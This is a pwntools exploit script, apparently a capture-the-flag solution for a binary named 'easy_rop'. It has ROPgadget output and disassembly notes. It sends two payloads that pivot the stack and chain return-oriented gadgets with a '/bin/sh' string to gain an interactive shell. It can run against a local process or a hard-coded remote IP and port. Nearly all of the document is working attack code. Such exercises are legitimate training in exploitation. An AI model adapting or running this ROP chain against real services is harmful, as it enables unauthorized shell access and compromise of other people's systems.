from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./easy_rop"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
else:
    io = remote("74.207.229.59", 20222)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()




"""
(pip_venv) ➜  ez_rop ROPgadget --binary ./easy_rop|grep pop|grep ret
0x00000000004010eb : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401127 : add eax, 0x4855c35d ; mov ebp, esp ; pop rdi ; pop rbp ; ret
0x000000000040112d : in eax, 0x5f ; pop rbp ; ret
0x00000000004010e6 : mov byte ptr [rip + 0x2f23], 1 ; pop rbp ; ret
0x000000000040112c : mov ebp, esp ; pop rdi ; pop rbp ; ret
0x000000000040112b : mov rbp, rsp ; pop rdi ; pop rbp ; ret
0x00000000004010ed : pop rbp ; ret
0x000000000040112e : pop rdi ; pop rbp ; ret
0x000000000040112a : push rbp ; mov rbp, rsp ; pop rdi ; pop rbp ; ret
"""
"""
0401106                 push    rbp
.text:0000000000401107                 mov     rbp, rsp
.text:000000000040110A                 lea     rcx, [rbp+buf]
.text:000000000040110E                 mov     rax, 0
"""
ddebug("b *0x00401126\n")
new_stack = 0x404000+0x200
playload = p64(0)
playload += b"/bin/sh\x00"
playload += p64(0)+p64(0)
playload += p64(new_stack) 
playload += p64(0x40110a)
playload += p64(0x404000+0x100)   #pop rbp
playload += p64(0x4010ed)         #ret
playload += p64(0)
playload += p64(0)
playload += p64(0)
playload += p64(0)
io.sendline(playload)


pause()
playload = p64(0)               #0x4041e0 
playload += b"/bin/sh\x00"
playload += p64(0x4010ed)
playload += p64(new_stack) 
playload += p64(0x40112e)  



io.sendline(playload)



io.interactive()
